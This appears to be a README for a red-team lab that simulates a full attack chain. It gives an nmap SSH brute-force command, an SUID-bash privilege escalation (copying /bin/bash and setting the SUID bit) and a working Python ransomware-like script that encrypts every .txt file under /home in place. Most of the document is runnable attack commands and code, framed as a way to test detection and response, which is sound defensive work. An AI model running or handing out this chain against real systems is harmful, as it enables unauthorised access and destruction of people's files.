# Red-Team-Attack simulation

Brute Force → Privilege Escalation → Ransomware Execution

This repository demonstrates a **complete attack chain simulation** in a controlled environment.
The goal is to emulate real-world attacker behavior to test and improve detection, response, and hardening capabilities.


> Simulated attack flow:

1. 🔐 **Brute-force attack** on SSH to gain user credentials.
2. 🧑‍💻 **Access the target system** using stolen credentials.
3. 🚀 **Privilege escalation** via shell misconfiguration (`/bin/bash -p`).
4. 💣 **Deploy and execute a ransomware-like script** to encrypt files.
5. 🔽 **De-escalation** (optional cleanup or simulation end).

---

## 🔧 Environment Setup

> Recommended tools & platforms:
- Target OS: **Ubuntu/Kali Linux VM**
- Attacker: **Kali Linux**
- Tools used: `nmap`, `ssh`, `bash`, custom `ransomware.sh` script

---

##  Step 1: Brute Force Attack

Simulate brute-forcing a user account (`victim`) using `nmap`:
nmap --script ssh-brute --script-args userdb=username.txt,passdb=passwords.txt -p 22 10.0.2.10

##  Step 2: login as a normal user 
 ssh user@server-ip

 ##  Step 3: privilege escalation via misconfiguration 
 
   As root, copy /bin/bash to /tmp/bash:
    cp /bin/bash /tmp/bash
    
   Make root the owner and set the SUID bit:
    chown root:root /tmp/bash
    chmod +s /tmp/bash
    
   Now, execute the bash binary as a normal user:
    /tmp/bash -p

##  Step 4:Deploy and execute a ransomware-like script

ransomware script :                    
  
    from cryptography.fernet import Fernet
    import os
    
    # Change to the target directory
    os.chdir("/home/")
    
    # Generate and save a Fernet key (only once, or reuse an existing one)
    key = Fernet.generate_key()
    with open("key.key", "wb") as f:
        f.write(key)
    
    # Initialize Fernet with the key
    fernet = Fernet(key)
    
    # Walk through the directory and encrypt all .txt files
    for root, dirs, files in os.walk(os.getcwd()):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)
                
                # Read original content
                with open(file_path, "rb") as f:
                    data = f.read()
                
                # Encrypt the content
                encrypted = fernet.encrypt(data)
                
                # Overwrite the file with encrypted content
                with open(file_path, "wb") as f:
                    f.write(encrypted)


 
    



